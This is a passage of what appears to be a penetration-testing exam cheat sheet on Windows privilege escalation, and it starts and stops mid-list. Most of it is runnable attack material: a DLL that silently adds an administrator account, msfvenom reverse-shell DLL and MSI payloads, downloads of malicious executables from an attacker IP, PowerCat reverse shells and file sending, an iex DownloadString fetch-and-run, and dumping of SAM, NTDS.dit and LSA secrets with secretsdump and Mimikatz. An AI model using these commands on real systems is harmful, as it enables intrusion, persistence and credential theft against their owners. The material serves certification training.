              <pre><code class="language-powershell"># Some services use configuration files that can be hijacked similarly to service binaries. Example: Checking permissions on a configuration file
icacls &quot;C:\Path\To\Service\ConfigFile.ini&quot;
</code></pre>
              <p><strong>Service Binary Analysis</strong>
                Keep. in mind that some of the PWK machines were solved using reverse engineering to find hardcoded
                credentials or important strings; so perform static analysis of the service binary to understand its
                behavior and identify potential weaknesses or vulnerabilities.</p>
              <ol>
                <li>
                  <p><strong>Bring the binary</strong> to the Kali: If you are using some <code>impacket-tool</code> you
                    can use their built-in function to bring the file; but if you are using a reverse shell use the
                    steps from the <strong>Section 17.6</strong> of this cheatsheet.</p>
                </li>
                <li>
                  <p><strong>Perform the analysis</strong> with multiple tools</p>
                </li>
              </ol>
              <pre><code class="language-bash">strings [downloaded_binary]

flare-floss [downloaded_binary]

# Use dnSpy if you know that the binary was built using .NET.

# You could also use tools like PEiD, IDA Pro, or Ghidra to analyze the binary (this is not recommended because the exam is usually not that complex and you could be going into a rabbit hole).
</code></pre>
              <p><strong>Monitor Service Activity</strong>
                After replacing the service binary, monitor system activity to ensure that the new binary is executed
                correctly and to identify any issues.</p>
              <pre><code class="language-powershell">Get-WinEvent -LogName System | Where-Object {$_.Message -like &quot;*&lt;ServiceName&gt;*&quot;}
</code></pre>
              <p><strong>Ensure Persistence</strong>
                For maintaining access, ensure that the changes are persistent across reboots and do not get overwritten
                by updates or system checks.</p>
              <pre><code class="language-powershell"># Check for system update settings that might revert changes
Get-WindowsUpdateLog
</code></pre>
              <h3 id="76-service-dll-hijacking">7.6 Service DLL Hijacking</h3>
              <p><strong>Windows searches for DLLs in a specific order</strong>. To exploit DLL hijacking, understand
                the order:</p>
              <ol>
                <li>The directory from which the application loaded.</li>
                <li>The system directory (e.g., <code>C:\Windows\System32</code>).</li>
                <li>The 16-bit system directory (e.g., <code>C:\Windows\System32\System</code>).</li>
                <li>The Windows directory (e.g., <code>C:\Windows</code>).</li>
                <li>The current directory.</li>
                <li>The directories listed in the <code>PATH</code> environment variable.</li>
              </ol>
              <p><strong>Tools to Find Possible DLL to Hijack</strong>
                Consider using tools like Process Monitor (<code>ProcMon</code>) to monitor DLL loading and Dependency
                Walker (<code>depends.exe</code>) to analyze DLL dependencies.</p>
              <p><strong>Display Running Service Information</strong></p>
              <pre><code class="language-powershell"># List running services and their executable paths
Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like &#39;Running&#39;}
</code></pre>
              <p><strong>Check PATH Locations</strong>
                Examine the <code>PATH</code> environment variable to determine where DLLs might be loaded from.</p>
              <pre><code class="language-powershell"># Display the PATH environment variable
$env:path
</code></pre>
              <p><strong>Create a Malicious DLL That Adds a New Administrator User</strong>
                Write a DLL that executes commands when loaded. For example, create a DLL to add a new administrator
                user.</p>
              <pre><code class="language-cpp">#include &lt;windows.h&gt;

BOOL APIENTRY DllMain(
    HMODULE hModule,       // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved      // Reserved
) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Execute system commands to add a new user and grant admin rights
        system(&quot;net user emma Password123! /add&quot;);
        system(&quot;net localgroup administrators emma /add&quot;);
    }
    return TRUE;
}
</code></pre>
              <pre><code class="language-bash"># Cross-Compile the DLL
x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
</code></pre>
              <p><strong>Creating a DLL that is a Reverse Shell</strong></p>
              <pre><code class="language-bash"># For 64-bit DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;Your_IP&gt; LPORT=&lt;Your_Port&gt; -f dll -o reverse_shell.dll

# For 32-bit DLL
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;Your_IP&gt; LPORT=&lt;Your_Port&gt; -f dll -o reverse_shell.dll
</code></pre>
              <p><strong>Replace the DLL and Restart the Service</strong>
                It can be a reverse shell generated from <code>msfvenom</code> or for example the program above that
                will add a new user to the system.</p>
              <pre><code class="language-powershell"># Bring the file from your Kali using an HTTP server

# Move the original DLL (back it up if necessary)
move &quot;C:\path\to\original\DLL.dll&quot; &quot;C:\path\to\backup\DLL.dll&quot;

# Replace it with your malicious DLL
move &quot;C:\path\to\malicious\myDLL.dll&quot; &quot;C:\path\to\service\DLL.dll&quot;

# Restart the service
Restart-Service -Name &quot;[serviceToHijack]&quot;
</code></pre>
              <p><strong>Verify Execution of the Malicious Code</strong>
                Check if the malicious code (e.g., user creation) has been executed successfully; or if it was the
                reverse shell you should have receive the connection to the Netcat listener back.</p>
              <pre><code class="language-powershell"># List users to check if the new user was added
net user

# List local administrators to verify if the new user is an admin
net localgroup administrators
</code></pre>
              <p><strong>Verify that the PATH environment variable still includes the expected directories.</strong></p>
              <pre><code class="language-powershell"># Display the PATH environment variable
$env:path
</code></pre>
              <h3 id="77-unquoted-service-paths">7.7 Unquoted Service Paths</h3>
              <p><strong>List Services with Unquotes Pahts</strong></p>
              <pre><code class="language-powershell">wmic service get name,pathname | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;
</code></pre>
              <p><strong>Path Resolution Process</strong>
                When Windows attempts to locate the executable, it checks paths in the following order:</p>
              <ol>
                <li><strong>Initial Path Attempt:</strong> Windows first attempts to execute the path as specified. For
                  example, if the service path is <code>C:\Program Files\MyApp\app.exe</code>, it tries to
                  run <code>C:\Program Files\MyApp\app.exe</code>.</li>
                <li><strong>Path Segmentation:</strong> If the path contains spaces and is not quoted, Windows tries
                  different combinations by breaking the path at each space and appending <code>.exe</code> to each
                  segment. This means Windows will attempt to execute:<ul>
                    <li><code>C:\Program.exe</code></li>
                    <li><code>C:\Program Files\MyApp.exe</code></li>
                    <li><code>C:\Program Files\MyApp\app.exe</code></li>
                  </ul>
                </li>
                <li><strong>Directory Check:</strong> If a malicious executable is placed in one of these directories
                  (e.g., <code>C:\Program Files\</code>), Windows might execute this malicious file instead of the
                  intended <code>app.exe</code>.</li>
              </ol>
              <p>For example, for a service path <code>C:\Program Files\ExampleApp\ExampleService.exe</code>, Windows
                might try: <code>C:\Program.exe</code> (if a malicious file is here). Proper quoting of paths is
                essential to prevent these vulnerabilities.</p>
              <p><strong>Review Directory Permissions</strong></p>
              <pre><code class="language-powershell">icacls &quot;&lt;PathToDirectory&gt;&quot;
</code></pre>
              <p><strong>Automating the Enumeration Process with PowerUp</strong></p>
              <pre><code class="language-powershell"># Download PowerUp script
iwr http://&lt;YourServerIP&gt;/PowerUp.ps1 -Outfile PowerUp.ps1

# Bypass execution policy and run the script
powershell -ep bypass
. .\PowerUp.ps1

# List unquoted service paths
Get-UnquotedService
</code></pre>
              <p><strong>Exploit Unquoted Service Paths</strong></p>
              <pre><code class="language-powershell"># Create the binary from Kali, could be any program, for example a reverse shell, or a program that adds a new user.

# Replace service binary with malicious executable (Manually)
copy &lt;malicious_file&gt; &quot;C:\Program Files\ExampleApp\Current.exe&quot;

# Replace service binary with malicious executable (with PowerUp)
Write-ServiceBinary -Name &#39;&lt;ServiceName&gt;&#39; -Path &#39;&lt;PathToMaliciousExecutable&gt;&#39;

# Restart the service
Restart-Service &lt;ServiceName&gt;

# Verify the service status
Get-Service -Name &#39;&lt;ServiceName&gt;&#39;

# Check event logs for service-related events
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -like &quot;*&lt;ServiceName&gt;*&quot;}
</code></pre>
              <h3 id="78-scheduled-tasks">7.8 Scheduled Tasks</h3>
              <p><strong>List all Scheduled Tasks</strong></p>
              <pre><code class="language-powershell">schtasks /query /fo LIST /v
</code></pre>
              <p><strong>Review Permissions on the Executable</strong></p>
              <pre><code class="language-powershell">icacls &quot;C:\Path\To\ScheduledTaskExecutable.exe&quot;
</code></pre>
              <p><strong>Download and Replace the Executable File</strong></p>
              <pre><code class="language-powershell">iwr -Uri http://&lt;attacker-ip&gt;/malicious.exe -Outfile malicious.exe

move C:\Path\To\TargetDirectory\Executable.exe C:\Path\To\Backup\OriginalExecutable.bak

move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe
</code></pre>
              <h3 id="79-internal-services">7.9 Internal Services</h3>
              <h4 id="791-display-active-network-connections">7.9.1 Display Active Network Connections</h4>
              <pre><code class="language-bash">netstat -ano

# Example output:
Proto  Local address      Remote address     State        PID
tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       -
tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       -
tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    -
tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  -
udp    0.0.0.0:135        0.0.0.0:*                       -
udp    192.168.1.9:500    0.0.0.0:*                       -
</code></pre>
              <h4 id="792-types-addresses">7.9.2 Types of Addresses</h4>
              <ul>
                <li><strong>Local address 0.0.0.0</strong>: Service is listening on all interfaces (external and
                  internal). Anyone can connect to it.</li>
                <li><strong>Local address 127.0.0.1</strong>: Service is only listening for connections from the local
                  machine. <strong>This is important to investigate</strong>.</li>
                <li><strong>Local address 192.168.x.x</strong>: Service is only listening for connections from the local
                  network (internal users). <strong>This is important to investigate</strong>.</li>
              </ul>
              <h3 id="710-cleartext-password-finding">7.10 Cleartext Password Finding</h3>
              <h4 id="7101-using-findstr">7.10.1 Using Findstr</h4>
              <pre><code class="language-bash">findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
</code></pre>
              <h4 id="7102-searching-in-configuration-files">7.10.2 Searching in Configuration Files</h4>
              <pre><code class="language-bash">dir /s *pass* == *cred* == *vnc* == *.config*
</code></pre>
              <h4 id="7102-searching-in-all-files">7.10.2 Searching in All Files</h4>
              <pre><code class="language-bash">findstr /spin &quot;password&quot; *.*
findstr /spin &quot;password&quot; *.*
</code></pre>
              <h4 id="7103-check-specific-files">7.10.3 Check Specific Files</h4>
              <p>These files often contain cleartext credentials:</p>
              <pre><code class="language-bash">c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
</code></pre>
              <h4 id="7104-searching-for-vnc-password-files">7.10.4 Searching for VNC Password Files</h4>
              <pre><code class="language-bash">dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
</code></pre>
              <h3 id="711-shadow-copies-sam-system-ntdsdit-security-ntuserdat">7.11 Shadow Copies (SAM, SYSTEM,
                NTDS.dit, SECURITY, NTUSER.dat)</h3>
              <p>If you find a <code>Windows.Old</code> folder or can access Volume Shadow Copies, you can copy
                important files
                like <code>SYSTEM</code>, <code>SAM</code>, <code>NTDS.dit</code>, <code>SECURITY</code>,
                and <code>NTUSER.dat</code> for offline credential extraction. Keep in mind that these could also be
                located in other folders, for example and SMB share folder; the path it is usually something like
                <code>C:\Windows\System32\SAM</code> or <code>C:\windows.old\Windows\System32\SAM</code>.
              </p>
              <p><strong>IMPORTANT:</strong> if we are using any <code>impacket-tool</code> we could use their built-in
                function to download the contents to our Kali, but if we are using a reverse shell we can <strong>use
                  the strategies of the Section 17 (File Transfers)</strong> to bring the files to our Kali.</p>
              <h4 id="7111-key-files-to-target">7.11.1 Key Files to Target</h4>
              <ul>
                <li><strong>SAM</strong>: Stores user password hashes.</li>
                <li><strong>SYSTEM</strong>: Used to decrypt SAM and other sensitive files.</li>
                <li><strong>NTDS.dit</strong>: Active Directory database, found on Domain Controllers, containing
                  domain-wide user credentials.</li>
                <li><strong>SECURITY</strong>: Contains LSA secrets, cached credentials, and security policies.</li>
                <li><strong>NTUSER.dat</strong>: Contains user-specific registry information, including credentials for
                  network drives or applications.</li>
              </ul>
              <h4 id="7112-dumping-sam-and-system-files">7.11.2 Dumping SAM and SYSTEM Files</h4>
              <ol>
                <li>Dump the <strong>SAM</strong> file</li>
              </ol>
              <pre><code class="language-powershell">reg save hklm\sam &lt;destination_path&gt;\sam
</code></pre>
              <ol start="2">
                <li>Dump the <strong>SYSTEM</strong> file</li>
              </ol>
              <pre><code class="language-powershell">reg save hklm\system &lt;destination_path&gt;\system
</code></pre>
              <ol start="3">
                <li><strong>Extract credentials</strong> on Kali</li>
              </ol>
              <pre><code class="language-bash">samdump2 &lt;system_file&gt; &lt;sam_file&gt;
or
impacket-secretsdump -sam &lt;sam_file&gt; -system &lt;system_file&gt; LOCAL
</code></pre>
              <ol start="4">
                <li><strong>(Optional): use Mimikatz</strong> to extract the credentials if it is not possible to bring
                  the files to the Kali.</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # lsadump::sam /sam:&quot;&lt;sam_file&gt;&quot; /system:&quot;&lt;system_file&gt;&quot;</code></pre>
              <h4 id="7113-accessing-ntdsdit-active-directory-database">7.11.3 Accessing NTDS.dit (Active Directory
                Database)</h4>
              <ol>
                <li>Copy <strong>NTDS.dit</strong> from a shadow copy</li>
              </ol>
              <pre><code class="language-powershell">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy&lt;ShadowCopyID&gt;\windows\ntds\ntds.dit &lt;destination_path&gt;\ntds.dit.bak
</code></pre>
              <ol start="2">
                <li>Save the <strong>SYSTEM</strong> hive for decryption</li>
              </ol>
              <pre><code class="language-powershell">reg.exe save hklm\system &lt;destination_path&gt;\system.bak
</code></pre>
              <ol start="3">
                <li><strong>Extract AD credentials</strong> on Kali</li>
              </ol>
              <pre><code class="language-bash">impacket-secretsdump -ntds &lt;ntds_dit_backup&gt; -system &lt;system_backup&gt; LOCAL
</code></pre>
              <ol start="4">
                <li><strong>(Optional): use Mimikatz</strong> to extract the credentials if it is not possible to bring
                  the files to the Kali.</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # lsadump::ntds /ntds:&quot;&lt;ntds_dit_backup&gt;&quot; /system:&quot;&lt;system_backup&gt;&quot;</code></pre>
              <h4 id="7114-dumping-security-hive-for-lsa-secrets--cached-credentials">7.11.4 Dumping SECURITY Hive for
                LSA Secrets &amp; Cached Credentials</h4>
              <ol>
                <li>Dump the <strong>SECURITY</strong> hive</li>
              </ol>
              <pre><code class="language-powershell">reg save hklm\security &lt;destination_path&gt;\security
</code></pre>
              <ol start="2">
                <li>Dump the <strong>SYSTEM</strong> file</li>
              </ol>
              <pre><code class="language-powershell">reg save hklm\system &lt;destination_path&gt;\system
</code></pre>
              <ol start="3">
                <li>Extract LSA Secrets on Kali</li>
              </ol>
              <pre><code class="language-bash">impacket-secretsdump -security &lt;security_file&gt; -system &lt;system_file&gt; LOCAL
</code></pre>
              <ol start="4">
                <li><strong>(Optional): use Mimikatz</strong> to extract the credentials if it is not possible to bring
                  the files to the Kali.</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # lsadump::secrets /security:&quot;&lt;security_file&gt;&quot; /system:&quot;&lt;system_file&gt;&quot;</code></pre>
              <h4 id="7115-extracting-user-specific-credentials-from-ntuserdat">7.11.5 Extracting User-Specific
                Credentials from NTUSER.dat</h4>
              <ol>
                <li>
                  <p><strong>Access <code>NTUSER.dat</code>:</strong>, download the <code>NTUSER.dat</code> file from a
                    user profile, typically found in <code>C:\Users\&lt;username&gt;\NTUSER.dat</code></p>
                </li>
                <li>
                  <p><strong>Load the NTUSER.dat hive</strong></p>
                </li>
              </ol>
              <pre><code class="language-powershell">reg load hku\TempHive &lt;path_to_ntuser.dat&gt;
</code></pre>
              <ol start="3">
                <li><strong>Look for credentials and interesting values:</strong> Check for saved credentials, network
                  drive mappings, or application data within the user&rsquo;s registry.</li>
              </ol>
              <h4 id="7116-general-volume-shadow-copy-access">7.11.6 General Volume Shadow Copy Access</h4>
              <p>We can use Volume Shadow Copies to access historical versions of key files:</p>
              <ol>
                <li>List <strong>available shadow copies</strong></li>
              </ol>
              <pre><code class="language-powershell">vssadmin list shadows
</code></pre>
              <ol start="2">
                <li>Copy any file from a shadow copy</li>
              </ol>
              <pre><code class="language-powershell">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy&lt;ShadowCopyID&gt;\&lt;path_to_file&gt; &lt;destination_path&gt;
</code></pre>
              <h3 id="712-alwayselevated-registry-check">7.12 AlwaysElevated Registry Check</h3>
              <p>If both the <strong>HKLM</strong> (<code>HKEY_LOCAL_MACHINE</code>) and <strong>HKCU</strong>
                (<code>HKEY_CURRENT_USER</code>) hives have the <strong>AlwaysInstallElevated</strong> key set to
                <code>1</code>, an attacker can create and execute a malicious MSI package with system-level privileges,
                bypassing normal user restrictions.
              </p>
              <h4 id="7121-how-to-check-for-the-vulnerability">7.12.1 How to Check for the Vulnerability</h4>
              <pre><code class="language-powershell"># Check in HKEY_LOCAL_MACHINE for system-wide policy
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Check in HKEY_CURRENT_USER for user-specific policy
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
</code></pre>
              <h4 id="7122-interpreting-the-results">7.12.2 Interpreting the Results</h4>
              <ul>
                <li>If both registry keys return a value of <code>1</code>, it means
                  <strong>AlwaysInstallElevated</strong> is enabled, and the system is vulnerable to this escalation
                  technique.
                </li>
                <li>If one or both keys return an error or a value other than <code>1</code>, the vulnerability is not
                  present.</li>
              </ul>
              <h4 id="7123-exploiting-the-vulnerability">7.12.3 Exploiting the Vulnerability</h4>
              <p>If both keys are set to <code>1</code>, you can create a malicious MSI package to escalate privileges:
              </p>
              <ol>
                <li><strong>Generate a malicious MSI</strong>: this payload could open a reverse shell, create a new
                  administrative user, or perform another privileged action.</li>
              </ol>
              <pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;your_ip&gt; LPORT=&lt;your_port&gt; -f msi -o malicious.msi
</code></pre>
              <ol start="2">
                <li>Set Up a Listener</li>
              </ol>
              <pre><code class="language-bash"># Using Netcat
nc -lvnp &lt;your_port&gt;

# Using Metasploit (forbidden in the exam)
msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST &lt;your_ip&gt;
set LPORT &lt;your_port&gt;
run
</code></pre>
              <ol start="3">
                <li><strong>Execute the MSI</strong>: as a low-privileged user, execute the MSI package using the
                  Windows Installer (<code>msiexec</code>), and it will run with elevated privileges.</li>
              </ol>
              <pre><code class="language-bash"># If the payload is a reverse shell, it could maybe work by just executing the .msi, try it; otherwise just use below steps
./malicious.msi

# This will install and execute the malicious MSI with system-level permissions, allowing you to escalate your privileges.
msiexec /quiet /qn /i malicious.msi

# The /quiet and /qn flags ensure that the installation runs silently without user interaction
# The /i flag specifies that you&#39;re installing the MSI package.
</code></pre>
              <h3 id="713-scripts">7.13 Scripts</h3>
              <h4 id="7131-winpeas">7.13.1 WinPEAS</h4>
              <p><strong>WinPEAS</strong> (Windows Privilege Escalation Awesome Script) is a script for enumerating
                privilege escalation opportunities on Windows systems.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-powershell">.\winPEAS.ps1
</code></pre>
              <p><strong>Save output to a file while preserving colors</strong></p>
              <pre><code class="language-powershell">.\winPEAS.ps1 | tee winpeas_output.txt
</code></pre>
              <p><strong>Save output to a file without preserving colors</strong></p>
              <pre><code class="language-powershell">.\winPEAS.ps1 | Out-File -FilePath winpeas_output.txt
</code></pre>
              <p><strong>Convert Output to HTML</strong></p>
              <ul>
                <li>Using the <strong>documentation method</strong></li>
              </ul>
              <pre><code class="language-powershell"># 1. Download file from victim to local Kali, we could use techniques from section 17.

# 2. Convert .txt to .json.
python3 peas2json.py ./winpeas_output.txt peass.json

# 3. Convert .json to .html.
python3 json2html.py peass.json peass.html

# (Optional) We could also convert it to PDF.
python3 json2pdf.py peass.json peass.pdf
</code></pre>
              <ul>
                <li>Using a <strong>quick method</strong> within the victim PowerShell</li>
              </ul>
              <pre><code class="language-powershell">Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
</code></pre>
              <h4 id="7132-powerup">7.13.2 PowerUp</h4>
              <p><strong>PowerUp</strong> is a PowerShell script designed to find and exploit privilege escalation
                vulnerabilities in Windows environments.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-powershell">.\powerup.ps1
</code></pre>
              <p><strong>Examples</strong></p>
              <ul>
                <li>Check for missing patches</li>
              </ul>
              <pre><code class="language-powershell">.\PowerUp.ps1 -CheckMissingPatches
</code></pre>
              <ul>
                <li>Check for unquoted service paths</li>
              </ul>
              <pre><code class="language-powershell">.\PowerUp.ps1 -UnquotedServicePaths
</code></pre>
              <ul>
                <li>Check for writable services</li>
              </ul>
              <pre><code class="language-powershell">.\PowerUp.ps1 -CheckWritableServices
</code></pre>
              <ul>
                <li>Check for scheduled tasks</li>
              </ul>
              <pre><code class="language-powershell">.\PowerUp.ps1 -ScheduledTasks
</code></pre>
              <ul>
                <li>Check for weak file permissions</li>
              </ul>
              <pre><code class="language-powershell">.\PowerUp.ps1 -WeakFilePermissions
</code></pre>
              <ul>
                <li>Check for auto-download binaries</li>
              </ul>
              <pre><code class="language-powershell">.\PowerUp.ps1 -AutoDownloadBinaries
</code></pre>
              <h4 id="7133-powercat">7.13.3 PowerCat</h4>
              <p><strong>PowerCat</strong> is a PowerShell script that functions similarly to Netcat and can be used for
                network communication, file transfers, and privilege escalation.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-powershell">.\powercat.ps1 -c [target_IP] -p [port] -e [command]
</code></pre>
              <p><strong>Examples</strong></p>
              <ul>
                <li>Basic reverse shell</li>
              </ul>
              <pre><code class="language-powershell">.\powercat.ps1 -c [attacker_IP] -p [port] -e powershell.exe
</code></pre>
              <ul>
                <li>File transfer</li>
              </ul>
              <pre><code class="language-powershell">.\powercat.ps1 -c [ATTACKER_IP] -p [PORT] -f [FILE_TO_SEND]
</code></pre>
              <ul>
                <li>Port Scanning</li>
              </ul>
              <pre><code class="language-powershell">.\powercat.ps1 -c [TARGET_IP] -p [PORT] -s
</code></pre>
              <h4 id="7134-powerview">7.13.4 PowerView</h4>
              <p><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank"><strong>PowerView</strong></a> is
                a PowerShell script for Active Directory (AD)
                enumeration and post-exploitation tasks.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-powershell">.\PowerView.ps1
or
powershell -ExecutionPolicy bypass
Import-Module ./PowerView.ps1
</code></pre>
              <p><strong>Examples</strong>:</p>
              <ul>
                <li>Get Domain User</li>
              </ul>
              <pre><code class="language-powershell">.\PowerView.ps1 -Command &quot;Get-NetUser&quot;
</code></pre>
              <ul>
                <li>Get Domain Admins</li>
              </ul>
              <pre><code class="language-powershell">.\PowerView.ps1 -Command &#39;Get-NetGroup -GroupName &quot;Domain Admins&quot;&#39;
</code></pre>
              <ul>
                <li>Find Kerberoastable Accounts</li>
              </ul>
              <pre><code class="language-powershell">.\PowerView.ps1 -Command &#39;Get-NetUser -SPN&#39;
</code></pre>
              <ul>
                <li>Enumerate Domain Controllers</li>
              </ul>
              <pre><code class="language-powershell">.\PowerView.ps1 -Command &#39;Get-NetDomainController&#39;
</code></pre>
              <ul>
                <li>Find Shares</li>
              </ul>
              <pre><code class="language-powershell">.\PowerView.ps1 -Command &#39;Get-NetShare&#39;
</code></pre>
              <ul>
                <li>Check for Delegation</li>
              </ul>
              <pre><code class="language-powershell">.\PowerView.ps1 -Command &#39;Get-NetUser -Delegation&#39;
</code></pre>
              <h4 id="7135-powermad">7.13.5 PowerMad</h4>
              <p><strong>PowerMad</strong> is a PowerShell script used to enumerate and exploit Active Directory Domain
                Services (AD DS) to escalate privileges.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-powershell">.\PowerMad.ps1
</code></pre>
              <p><strong>Examples</strong></p>
              <ul>
                <li>List domain admin groups</li>
              </ul>
              <pre><code class="language-powershell">.\PowerMad.ps1 -Command &quot;Get-DomainAdminGroup&quot;
</code></pre>
              <ul>
                <li>Save output to a file</li>
              </ul>
              <pre><code class="language-powershell">.\PowerMad.ps1 -Command &quot;Get-DomainAdminGroup&quot; | Out-File -FilePath powermad_output.txt
</code></pre>
              <h4 id="7136-privesccheck">7.13.6 PrivescCheck</h4>
              <p><strong>PrivescCheck.ps1</strong> is a PowerShell script that performs a comprehensive check for common
                privilege escalation vectors on Windows systems.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-powershell">.\PrivescCheck.ps1
</code></pre>
              <p><strong>Examples</strong></p>
              <ul>
                <li>Run PrivescCheck</li>
              </ul>
              <pre><code class="language-powershell">.\PrivescCheck.ps1
</code></pre>
              <ul>
                <li>Save output to a file</li>
              </ul>
              <pre><code class="language-powershell">.\PrivescCheck.ps1 | Out-File -FilePath privesccheck_output.txt
</code></pre>
              <h4 id="7137-seatbelt">7.13.7 Seatbelt</h4>
              <p>Seatbelt is a C# tool that performs various checks to identify privilege escalation opportunities.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-powershell">.\Seatbelt.exe
</code></pre>
              <h4 id="7138-powersharppack">7.13.8 PowerSharpPack</h4>
              <p><strong><a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">PowerSharpPack</a></strong> is a
                collection of C# offensive security tools wrapped in PowerShell for ease of use. The tools are aimed at
                bypassing modern defenses like AMSI, Script-block logging, and Constrained Language Mode, making
                PowerShell still viable for offensive operations.</p>
              <h5 id="71381-setup">7.13.8.1 Setup</h5>
              <ol>
                <li>Clone the repository:</li>
              </ol>
              <pre><code class="language-bash">git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack
cd PowerSharpPack
</code></pre>
              <ol start="2">
                <li>Load the main PowerSharpPack script:</li>
              </ol>
              <pre><code class="language-powershell">iex (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1&#39;)
</code></pre>
              <ol start="3">
                <li>Use the tool by specifying the required utility with the <code>-Command</code> switch:</li>
              </ol>
              <pre><code class="language-powershell">PowerSharpPack -seatbelt -Command &quot;AMSIProviders&quot;
</code></pre>
              <h5 id="71382-included-tools-and-code-examples">7.13.8.2 Included Tools and Code Examples</h5>
              <ul>
                <li><strong><a href="https://github.com/eladshamir/Internal-Monologue">InternalMonologue</a></strong>:
                  retrieve NTLM hashes without touching LSASS.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -InternalMonologue
</code></pre>
              <ul>
                <li><strong><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></strong>: perform
                  security-related host-survey checks (both offensive and defensive).</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -seatbelt -Command &quot;AMSIProviders&quot;
</code></pre>
              <ul>
                <li><strong><a href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a></strong>: retrieve saved
                  browser credentials (Google Chrome, Firefox, IE/Edge).</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharpWeb
</code></pre>
              <ul>
                <li><strong><a href="https://github.com/FuzzySecurity/Sharp-Suite">UrbanBishop</a></strong>: shellcode
                  injection using RW/RX section mapping in remote processes.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -UrbanBishop
</code></pre>
              <ul>
                <li><strong><a href="https://github.com/GhostPack/SharpUp">SharpUp</a></strong>: privilege escalation
                  enumeration for Windows systems.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharpUp
</code></pre>
              <ul>
                <li><strong><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></strong>: perform Kerberos attacks
                  such as ticket requests, ticket extraction, etc.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -Rubeus -Command &quot;kerberoast /outfile:Roasted.txt&quot;
</code></pre>
              <ul>
                <li><strong><a href="https://github.com/fireeye/SharPersist">SharPersist</a></strong>: create Windows
                  persistence mechanisms.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharPersist -Command &quot;Persist&quot;
</code></pre>
              <ul>
                <li><strong><a href="https://github.com/tevora-threat/SharpView">SharpView</a></strong>: AD enumeration,
                  C# implementation of PowerView.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharpView -Command &quot;Get-Domain&quot;
</code></pre>
              <ul>
                <li><strong><a
                      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">WinPEAS</a></strong>:
                  check for local privilege escalation vectors in Windows.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -winPEAS
</code></pre>
              <ul>
                <li><strong><a href="https://github.com/djhohnstein/SharpChromium">SharpChromium</a></strong>: extract
                  cookies, history, and credentials from Chromium-based browsers.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharpChromium
</code></pre>
              <h5 id="71383-standalone-scripts">7.13.8.3 Standalone Scripts</h5>
              <p>Some tools are available as standalone PowerShell scripts in the <code>PowerSharpBinaries</code>
                folder:</p>
              <ul>
                <li><strong>SharpCloud</strong>: Check for credential files related to AWS, Azure, and GCP.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharpCloud
</code></pre>
              <ul>
                <li><strong>SharpGPOAbuse</strong>: Abuse Group Policy Object (GPO) permissions for lateral movement.
                </li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharpGPOAbuse
</code></pre>
              <ul>
                <li><strong>SauronEye</strong>: Search for files containing sensitive keywords like
                  &quot;password.&quot;</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SauronEye
</code></pre>
              <h5 id="71384-additional-tools">7.13.8.4 Additional Tools</h5>
              <ul>
                <li><strong>SharpShares</strong>: Enumerate network shares.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharpShares
</code></pre>
              <ul>
                <li><strong>SharpSniper</strong>: Find AD users by their logon IP.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharpSniper
</code></pre>
              <ul>
